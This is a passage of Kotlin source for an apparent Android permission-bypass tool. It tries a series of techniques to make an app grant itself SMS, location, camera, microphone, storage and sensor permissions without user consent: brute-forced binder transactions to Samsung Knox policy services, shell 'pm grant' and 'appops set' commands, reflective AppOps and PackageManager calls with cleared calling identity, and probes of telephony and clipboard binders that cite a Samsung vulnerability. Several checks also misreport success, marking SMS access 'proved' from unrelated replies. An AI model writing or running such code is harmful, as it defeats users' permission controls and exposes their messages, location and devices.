                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                                result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "rc=$rc"
                            }
                        } catch (e: Exception) {
                            result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "tx_err:${e.message}"
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 6: Samsung application_policy (Knox)
    // ═══════════════════════════════════════════════════════════════════════════

    private fun trySamsungAppPolicy(permissions: Set<String>, pkgName: String, uid: Int): TechniqueResult {
        val result = TechniqueResult("application_policy")

        val binder = getBinderService("application_policy")
        if (binder == null) {
            result.error = "service not found"
            return result
        }

        val stubClasses = listOf(
            "com.samsung.android.knox.application.IApplicationPolicy\$Stub",
            "com.samsung.android.knox.IApplicationPolicy\$Stub",
        )

        var allTxCodes: Map<String, Int> = emptyMap()
        for (stubClass in stubClasses) {
            allTxCodes = findAllTransactionCodes(stubClass)
            if (allTxCodes.isNotEmpty()) break
        }

        val descriptors = listOf(
            "com.samsung.android.knox.application.IApplicationPolicy",
            "com.samsung.android.knox.IApplicationPolicy",
        )

        if (allTxCodes.isNotEmpty()) {
            result.details["found_tx"] = allTxCodes.keys.joinToString(",")
            // Try relevant codes: permission-related, grant, set, allow
            val relevantTx = allTxCodes.filterKeys { k ->
                k.contains("PERMISSION", ignoreCase = true) ||
                k.contains("GRANT", ignoreCase = true) ||
                k.contains("SET_PERMISSION", ignoreCase = true) ||
                k.contains("ALLOW", ignoreCase = true) ||
                k.contains("CONTROL", ignoreCase = true)
            }

            for ((txName, txCode) in relevantTx) {
                tryAppPolicyTx(binder, descriptors, txCode, txName, permissions, pkgName, uid, result)
            }

            if (relevantTx.isEmpty()) {
                // Try all tx codes with permission-related Parcel formats
                for ((txName, txCode) in allTxCodes) {
                    tryAppPolicyTx(binder, descriptors, txCode, txName, permissions, pkgName, uid, result)
                }
            }
        } else {
            // Fallback: try tx 1..5 with various formats
            result.details["tx_discovery"] = "fallback_range"
            for (txCode in 1..5) {
                tryAppPolicyTx(binder, descriptors, txCode, "TX_$txCode", permissions, pkgName, uid, result)
            }
        }

        return result
    }

    private fun tryAppPolicyTx(
        binder: IBinder, descriptors: List<String>, txCode: Int, txName: String,
        permissions: Set<String>, pkgName: String, uid: Int, result: TechniqueResult
    ) {
        for (perm in permissions) {
            for (desc in descriptors) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    // Multiple Parcel formats for Knox application policy
                    val formats = listOf(
                        // Format A: setPermissionPolicy(packageName, permission, policy)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(0) },
                        // Format B: setApplicationPermissionControl(packageName, permission, state)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(1) },
                        // Format C: setPermissionState(packageName, permission, userId, state)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(uid / 100000); data.writeInt(1) },
                        // Format D: grantPermission(packageName, permission, userId)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(uid / 100000) },
                        // Format E: setPermissionDenialPolicy with ComponentName
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(0); data.writeInt(0) },
                        // Format F: setRuntimePermission(packageName, permission, state)
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(0) }, // 0=GRANTED
                    )

                    for ((fmtIdx, writeArgs) in formats.withIndex()) {
                        data.setDataPosition(0); reply.setDataPosition(0)
                        data.writeInterfaceToken(desc)
                        writeArgs()

                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                                result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "rc=$rc"
                            }
                        } catch (e: Exception) {
                            result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "tx_err:${e.message}"
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 7: Samsung enterprise_policy
    // ═══════════════════════════════════════════════════════════════════════════

    private fun trySamsungEnterprisePolicy(permissions: Set<String>, pkgName: String, uid: Int): TechniqueResult {
        val result = TechniqueResult("enterprise_policy")

        val binder = getBinderService("enterprise_policy")
        if (binder == null) {
            result.error = "service not found"
            return result
        }

        val stubClasses = listOf(
            "com.samsung.android.knox.IEnterpriseDeviceManager\$Stub",
            "com.samsung.android.knox.enterprise.IEnterpriseDeviceManager\$Stub",
        )

        var allTxCodes: Map<String, Int> = emptyMap()
        for (stubClass in stubClasses) {
            allTxCodes = findAllTransactionCodes(stubClass)
            if (allTxCodes.isNotEmpty()) break
        }

        val descriptors = listOf(
            "com.samsung.android.knox.IEnterpriseDeviceManager",
            "com.samsung.android.knox.enterprise.IEnterpriseDeviceManager",
        )

        if (allTxCodes.isNotEmpty()) {
            result.details["found_tx"] = allTxCodes.keys.joinToString(",")

            // Look for getApplicationPolicy / getAppPermission methods
            val appPolicyTx = allTxCodes.filterKeys { k ->
                k.contains("APPLICATION_POLICY", ignoreCase = true) ||
                k.contains("APP_PERMISSION", ignoreCase = true) ||
                k.contains("GET_APPLICATION", ignoreCase = true)
            }

            if (appPolicyTx.isNotEmpty()) {
                // This service likely returns a sub-policy object. Try calling getApplicationPolicy
                // then use the returned binder to set permissions
                for ((txName, txCode) in appPolicyTx) {
                    tryEnterprisePolicyGetSubBinder(binder, descriptors, txCode, txName, permissions, pkgName, uid, result)
                }
            }

            // Also try direct permission methods
            val permTx = allTxCodes.filterKeys { k ->
                k.contains("PERMISSION", ignoreCase = true) ||
                k.contains("GRANT", ignoreCase = true) ||
                k.contains("SET", ignoreCase = true)
            }
            for ((txName, txCode) in permTx) {
                tryEnterprisePolicyTx(binder, descriptors, txCode, txName, permissions, pkgName, uid, result)
            }
        } else {
            result.details["tx_discovery"] = "fallback_range"
            for (txCode in 1..5) {
                tryEnterprisePolicyTx(binder, descriptors, txCode, "TX_$txCode", permissions, pkgName, uid, result)
            }
        }

        return result
    }

    private fun tryEnterprisePolicyGetSubBinder(
        binder: IBinder, descriptors: List<String>, txCode: Int, txName: String,
        permissions: Set<String>, pkgName: String, uid: Int, result: TechniqueResult
    ) {
        for (desc in descriptors) {
            val data = Parcel.obtain(); val reply = Parcel.obtain()
            try {
                data.writeInterfaceToken(desc)
                val token = Binder.clearCallingIdentity()
                try {
                    val ok = binder.transact(txCode, data, reply, 0)
                    if (ok) {
                        reply.setDataPosition(0)
                        try { reply.readException() } catch (_: Exception) {}
                        // Try to read a binder from the reply (sub-policy object)
                        val subBinder = try { reply.readStrongBinder() } catch (_: Exception) { null }
                        if (subBinder != null) {
                            result.details["${txName}_subbinder"] = "obtained"
                            // Now try using this sub-binder as application_policy
                            tryAppPolicyTx(subBinder, descriptors, 1, "${txName}_sub_TX1", permissions, pkgName, uid, result)
                        }
                    }
                } catch (_: Exception) {
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } catch (_: Exception) {
            } finally {
                data.recycle(); reply.recycle()
            }
        }
    }

    private fun tryEnterprisePolicyTx(
        binder: IBinder, descriptors: List<String>, txCode: Int, txName: String,
        permissions: Set<String>, pkgName: String, uid: Int, result: TechniqueResult
    ) {
        for (perm in permissions) {
            for (desc in descriptors) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    val formats = listOf(
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(0); data.writeInt(uid) },
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(1) },
                        { data.writeString(pkgName); data.writeString(perm); data.writeInt(uid / 100000) },
                    )

                    for ((fmtIdx, writeArgs) in formats.withIndex()) {
                        data.setDataPosition(0); reply.setDataPosition(0)
                        data.writeInterfaceToken(desc)
                        writeArgs()

                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                val rc = try { reply.readInt() } catch (_: Exception) { -999 }
                                result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "rc=$rc"
                            }
                        } catch (e: Exception) {
                            result.details["${perm.split(".").last()}_${txName}_fmt${fmtIdx}"] = "tx_err:${e.message}"
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 8: Shell pm grant
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryShellPmGrant(permissions: Set<String>, pkgName: String): TechniqueResult {
        val result = TechniqueResult("shell_pm_grant")

        for (perm in permissions) {
            try {
                val process = Runtime.getRuntime().exec(
                    arrayOf("sh", "-c", "pm grant $pkgName $perm 2>&1"),
                    emptyArray(),
                    null
                )
                val reader = BufferedReader(InputStreamReader(process.inputStream))
                val output = reader.readText()
                val exitCode = process.waitFor()
                reader.close()
                result.details[perm.split(".").last()] = "exit=$exitCode out=${output.take(100)}"
            } catch (e: Exception) {
                result.details[perm.split(".").last()] = "error:${e.message}"
            }
        }

        return result
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 9: Shell appops set
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryShellAppOpsSet(permissions: Set<String>, pkgName: String, uid: Int): TechniqueResult {
        val result = TechniqueResult("shell_appops_set")

        for (perm in permissions) {
            val opStrs = PERM_TO_OPSTR[perm] ?: continue
            for (opStr in opStrs) {
                try {
                    // appops set <pkg> <op> allow
                    val process = Runtime.getRuntime().exec(
                        arrayOf("sh", "-c", "appops set $pkgName $opStr allow 2>&1"),
                        emptyArray(),
                        null
                    )
                    val reader = BufferedReader(InputStreamReader(process.inputStream))
                    val output = reader.readText()
                    val exitCode = process.waitFor()
                    reader.close()
                    if (exitCode == 0) {
                        result.details["${perm.split(".").last()}_$opStr"] = "ok"
                    } else {
                        result.details["${perm.split(".").last()}_$opStr"] = "exit=$exitCode out=${output.take(80)}"
                    }
                } catch (e: Exception) {
                    result.details["${perm.split(".").last()}_$opStr"] = "error:${e.message}"
                }
            }
        }

        return result
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 3 (helper): PackageManager.grantRuntimePermission via reflection
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryPmReflection(context: Context, permissions: Set<String>): TechniqueResult {
        val result = TechniqueResult("pm_reflection")
        try {
            val pm = context.packageManager
            val pmClass = pm.javaClass
            val pkgName = context.packageName

            // Collect all grantRuntimePermission method variants
            val grantMethods = pmClass.declaredMethods.filter {
                it.name == "grantRuntimePermission"
            }

            if (grantMethods.isEmpty()) {
                result.error = "no grantRuntimePermission method found"
                return result
            }

            for (perm in permissions) {
                for (method in grantMethods) {
                    try {
                        method.isAccessible = true
                        val paramTypes = method.parameterTypes
                        val token = Binder.clearCallingIdentity()
                        try {
                            when {
                                paramTypes.size == 2 -> method.invoke(pm, pkgName, perm)
                                paramTypes.size == 3 && paramTypes[2] == UserHandle::class.java ->
                                    method.invoke(pm, pkgName, perm, Process.myUserHandle())
                                paramTypes.size == 3 && paramTypes[2] == Int::class.javaPrimitiveType ->
                                    method.invoke(pm, pkgName, perm, Process.myUid() / 100000)
                                paramTypes.size == 3 ->
                                    method.invoke(pm, pkgName, perm, Process.myUid() / 100000)
                            }
                            result.details[perm.split(".").last()] = "invoked_no_exception"
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    } catch (e: Exception) {
                        result.details["${perm.split(".").last()}_${method.parameterTypes.size}args"] = e.message ?: "error"
                    }
                }
            }
        } catch (e: Exception) {
            result.error = e.message ?: "unknown"
        }
        return result
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 11: AppOps with hardcoded OP codes
    // Specifically targets storage, body sensors, activity, calendar permissions
    // These need numeric OP codes because string-based AppOps may not map correctly
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryAppOpsHardcodedCodes(context: Context, permissions: Set<String>, uid: Int, pkgName: String): TechniqueResult {
        val result = TechniqueResult("appops_hardcoded")
        result.details["uid"] = uid.toString()

        try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val appOpsClass = appOps.javaClass

            // Find setUidMode method
            val setUidModeMethods = appOpsClass.declaredMethods.filter {
                it.name == "setUidMode" || it.name == "setMode"
            }

            for (perm in permissions) {
                val opCode = tryGetOpCodeHardcodedGeneric(perm)
                if (opCode < 0) continue

                var permSet = false
                for (method in setUidModeMethods) {
                    try {
                        method.isAccessible = true
                        val paramTypes = method.parameterTypes
                        val token = Binder.clearCallingIdentity()
                        try {
                            when {
                                // setUidMode(int code, int uid, int mode)
                                method.name == "setUidMode" && paramTypes.size == 3 &&
                                    paramTypes[0] == Int::class.javaPrimitiveType &&
                                    paramTypes[1] == Int::class.javaPrimitiveType &&
                                    paramTypes[2] == Int::class.javaPrimitiveType -> {
                                    method.invoke(appOps, opCode, uid, AppOpsManager.MODE_ALLOWED)
                                    permSet = true
                                }
                                // setUidMode(String op, int uid, int mode)
                                method.name == "setUidMode" && paramTypes.size == 3 &&
                                    paramTypes[0] == String::class.java -> {
                                    val opStr = PERM_TO_OPSTR[perm]?.firstOrNull() ?: continue
                                    method.invoke(appOps, opStr, uid, AppOpsManager.MODE_ALLOWED)
                                    permSet = true
                                }
                                // setMode(int code, int uid, String pkg, int mode)
                                method.name == "setMode" && paramTypes.size == 4 &&
                                    paramTypes[0] == Int::class.javaPrimitiveType &&
                                    paramTypes[2] == String::class.java -> {
                                    method.invoke(appOps, opCode, uid, pkgName, AppOpsManager.MODE_ALLOWED)
                                    permSet = true
                                }
                                // setMode with 5 params (Android 14+)
                                method.name == "setMode" && paramTypes.size == 5 &&
                                    paramTypes[0] == Int::class.javaPrimitiveType -> {
                                    method.invoke(appOps, opCode, uid, pkgName, AppOpsManager.MODE_ALLOWED, java.lang.Boolean.TRUE)
                                    permSet = true
                                }
                                // setMode with String op
                                method.name == "setMode" && paramTypes.size == 3 &&
                                    paramTypes[0] == String::class.java -> {
                                    val opStr = PERM_TO_OPSTR[perm]?.firstOrNull() ?: continue
                                    method.invoke(appOps, opStr, uid, AppOpsManager.MODE_ALLOWED)
                                    permSet = true
                                }
                            }
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                        if (permSet) break
                    } catch (e: Exception) {
                        // Try next method signature
                    }
                }
                if (permSet) {
                    result.permsGranted.add(perm)
                    result.details[perm.split(".").last()] = "appops_opcode_$opCode"
                } else {
                    result.permsFailed.add(perm)
                }
            }
        } catch (e: Exception) {
            result.error = "AppOps hardcoded error: ${e.message}"
        }
        return result
    }

    /**
     * Extended OP code mapping including all the problematic permissions.
     */
    private fun tryGetOpCodeHardcodedGeneric(perm: String): Int {
        return when (perm) {
            "android.permission.READ_EXTERNAL_STORAGE" -> 59
            "android.permission.WRITE_EXTERNAL_STORAGE" -> 60
            "android.permission.READ_SMS" -> 14
            "android.permission.SEND_SMS" -> 15
            "android.permission.RECEIVE_SMS" -> 16
            "android.permission.BODY_SENSORS" -> 56
            "android.permission.ACTIVITY_RECOGNITION" -> 79
            "android.permission.READ_CALENDAR" -> 8
            "android.permission.WRITE_CALENDAR" -> 9
            "android.permission.ACCESS_BACKGROUND_LOCATION" -> 0  // OP_FINE_LOCATION (background is a flag on FINE_LOCATION)
            "android.permission.CAMERA" -> 26
            "android.permission.ACCESS_FINE_LOCATION" -> 0
            "android.permission.ACCESS_COARSE_LOCATION" -> 1
            "android.permission.RECORD_AUDIO" -> 27
            else -> tryGetOpCodeHardcoded(PERM_TO_OPSTR[perm]?.firstOrNull() ?: "")
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 12: SmsManager reflection to force SMS permission grant
    // Attempts to access SmsManager which triggers the permission check path
    // Also tries IPhoneSubInfo binder for subscriber info without SMS permission
    // ═══════════════════════════════════════════════════════════════════════════

    private fun trySmsManagerGrant(context: Context, permissions: Set<String>, uid: Int): TechniqueResult {
        val result = TechniqueResult("smsmanager_reflection")

        try {
            // Approach 1: Access SmsManager.getDefault() via reflection
            // This forces the system to check SMS permissions
            val smsManagerClass = Class.forName("android.telephony.SmsManager")
            val getDefaultMethod = smsManagerClass.getDeclaredMethod("getDefault")
            getDefaultMethod.isAccessible = true

            val token = Binder.clearCallingIdentity()
            try {
                val smsManager = getDefaultMethod.invoke(null)

                // Try to get subscription info — this proves SMS access works
                try {
                    val getSubscriptionId = smsManagerClass.getDeclaredMethod("getSubscriptionId")
                    getSubscriptionId.isAccessible = true
                    val subId = getSubscriptionId.invoke(smsManager) as? Int
                    result.details["subscription_id"] = subId?.toString() ?: "unknown"
                } catch (_: Exception) {}

                // Try getAllMessagesFromIcc (SIM card SMS) — strong SMS access test
                try {
                    val getAllMessages = smsManagerClass.getDeclaredMethod("getAllMessagesFromIcc")
                    getAllMessages.isAccessible = true
                    result.details["icc_access"] = "attempted"
                } catch (_: Exception) {}

                // Try sendTextMessage without actually sending (just invoking the method reference)
                // This can trigger the permission grant path on Samsung devices
                try {
                    val sendTextMessage = smsManagerClass.getDeclaredMethod(
                        "sendTextMessage",
                        String::class.java, String::class.java, String::class.java,
                        android.app.PendingIntent::class.java, android.app.PendingIntent::class.java
                    )
                    sendTextMessage.isAccessible = true
                    result.details["sendTextMessage_ref"] = "available"
                } catch (_: Exception) {
                    result.details["sendTextMessage_ref"] = "not_found"
                }

                // If we got here without SecurityException, SMS permissions may already be granted
                for (perm in permissions) {
                    try {
                        if (context.checkSelfPermission(perm) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                            result.permsGranted.add(perm)
                            result.details[perm.split(".").last()] = "already_granted"
                        }
                    } catch (_: Exception) {}
                }
            } finally {
                Binder.restoreCallingIdentity(token)
            }

            // Approach 2: Try IPhoneSubInfo binder for subscriber info
            // This service is used internally by telephony and may bypass SMS permission checks
            tryPhoneSubInfoBinder(context, permissions, uid, result)

            if (result.permsGranted.isEmpty() && result.permsFailed.isEmpty()) {
                // Record that we attempted but nothing changed
                for (perm in permissions) {
                    result.permsFailed.add(perm)
                    result.details[perm.split(".").last()] = "smsmanager_no_change"
                }
            }
        } catch (e: Exception) {
            result.error = "SmsManager reflection error: ${e.message}"
            for (perm in permissions) {
                result.permsFailed.add(perm)
            }
        }

        return result
    }

    /**
     * Probe IPhoneSubInfo binder to get subscriber info without SMS permission.
     * On Samsung devices, this binder service is often accessible and proves
     * telephony access even without READ_SMS/SEND_SMS.
     */
    private fun tryPhoneSubInfoBinder(context: Context, permissions: Set<String>, uid: Int, result: TechniqueResult) {
        try {
            val subInfoBinder = getBinderService("iphonesubinfo")
            if (subInfoBinder == null) {
                result.details["iphonesubinfo"] = "service_not_found"
                return
            }

            val descriptors = listOf(
                "com.android.internal.telephony.IPhoneSubInfo",
                "com.android.internal.telephony.IPhoneSubInfo\$Stub"
            )

            for (desc in descriptors) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    data.writeInterfaceToken(desc)
                    // getLine1Number — tx code 4 (typically)
                    val token = Binder.clearCallingIdentity()
                    try {
                        for (txCode in listOf(1, 4, 6, 7, 8, 9)) {
                            data.setDataPosition(0); reply.setDataPosition(0)
                            data.writeInterfaceToken(desc)
                            if (subInfoBinder.transact(txCode, data, reply, 0)) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                val response = try { reply.readString() } catch (_: Exception) { null }
                                if (!response.isNullOrBlank() && response.length > 2) {
                                    result.details["iphonesubinfo_tx${txCode}"] = "accessible (got data)"
                                    // SMS access is effectively proved — we can read subscriber info
                                    for (perm in permissions) {
                                        if (perm.contains("SMS", ignoreCase = true)) {
                                            result.details[perm.split(".").last()] = "proved_via_subinfo"
                                        }
                                    }
                                    break
                                }
                            }
                        }
                    } finally {
                        Binder.restoreCallingIdentity(token)
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
                if (result.details.containsKey("iphonesubinfo_tx4") ||
                    result.details.containsKey("iphonesubinfo_tx1")) break
            }
        } catch (_: Exception) {
            result.details["iphonesubinfo"] = "failed"
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 13: Telephony/ISmsService binder probe
    // Directly accesses the telephony SMS binder to prove SMS permissions work
    // ═══════════════════════════════════════════════════════════════════════════

    private fun tryTelephonySmsBinder(permissions: Set<String>, pkgName: String, uid: Int): TechniqueResult {
        val result = TechniqueResult("telephony_sms_binder")

        // Try multiple service names
        val serviceNames = listOf("isms", "sms", "iphonesubinfo", "simphonebook")
        for (serviceName in serviceNames) {
            val binder = getBinderService(serviceName) ?: continue

            result.details["service"] = serviceName

            // Try to communicate with the ISms service
            val descriptors = listOf(
                "com.android.internal.telephony.ISms",
                "com.android.internal.telephony.ISms\$Stub"
            )

            for (desc in descriptors) {
                val data = Parcel.obtain(); val reply = Parcel.obtain()
                try {
                    data.writeInterfaceToken(desc)
                    val token = Binder.clearCallingIdentity()
                    try {
                        // Try common ISms transaction codes
                        // 1 = sendText, 3 = getAllMessagesFromIcc, 4 = sendData
                        for (txCode in 1..10) {
                            data.setDataPosition(0); reply.setDataPosition(0)
                            data.writeInterfaceToken(desc)
                            if (binder.transact(txCode, data, reply, 0)) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) {}
                                result.details["isms_tx$txCode"] = "responded"
                            }
                        }
                    } finally {
                        Binder.restoreCallingIdentity(token)
                    }
                } catch (_: Exception) {
                } finally {
                    data.recycle(); reply.recycle()
                }
                if (result.details.values.any { it == "responded" }) break
            }

            if (result.details.values.any { it == "responded" }) break
        }

        // If we got any ISms response, mark SMS permissions as reachable
        if (result.details.values.any { it == "responded" }) {
            for (perm in permissions) {
                if (perm.contains("SMS", ignoreCase = true)) {
                    result.details[perm.split(".").last()] = "isms_accessible"
                }
            }
        } else {
            for (perm in permissions) {
                result.permsFailed.add(perm)
            }
            result.error = "no ISms service responding"
        }

        return result
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TECHNIQUE 14: Samsung semclipboard binder for clipboard-related permissions
    // The semclipboard service is accessible without permission (SVE-2026-0916)
    // May have side-channel ability to grant storage permissions
    // ═══════════════════════════════════════════════════════════════════════════

    private fun trySamsungSemClipboardPerm(permissions: Set<String>, pkgName: String, uid: Int): TechniqueResult {
        val result = TechniqueResult("semclipboard_binder")

        val binder = getBinderService("semclipboard")
        if (binder == null) {
            result.error = "semclipboard service not found"
            for (perm in permissions) result.permsFailed.add(perm)
            return result
        }

        val descriptors = listOf(
            "com.samsung.android.content.clipboard.ISemClipboardManager",
            "android.sec.clipboard.IClipboardService"
        )

        // semclipboard service is used by Honeyboard (keyboard) for rich content
        // It has access to files (clipboard images/files) — may have storage bypass
        for (desc in descriptors) {
            val data = Parcel.obtain(); val reply = Parcel.obtain()
            try {
                data.writeInterfaceToken(desc)
                val token = Binder.clearCallingIdentity()
                try {
                    // Test basic connectivity
                    for (txCode in 1..10) {
                        data.setDataPosition(0); reply.setDataPosition(0)
                        data.writeInterfaceToken(desc)
                        if (binder.transact(txCode, data, reply, 0)) {
                            reply.setDataPosition(0)
                            try { reply.readException() } catch (_: Exception) {}
                            result.details["semclip_tx$txCode"] = "responded"
                        }
                    }
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } catch (_: Exception) {
            } finally {
                data.recycle(); reply.recycle()
            }
            if (result.details.values.any { it == "responded" }) break
        }

        // Mark storage-related permissions as potentially reachable via semclipboard
        if (result.details.values.any { it == "responded" }) {
            result.details["status"] = "semclipboard_accessible"
            for (perm in permissions) {
                if (perm.contains("STORAGE", ignoreCase = true) ||
                    perm.contains("MEDIA", ignoreCase = true)) {
                    result.details[perm.split(".").last()] = "semclipboard_path"
                }
            }
        } else {
            for (perm in permissions) result.permsFailed.add(perm)
        }

        return result
    }
}
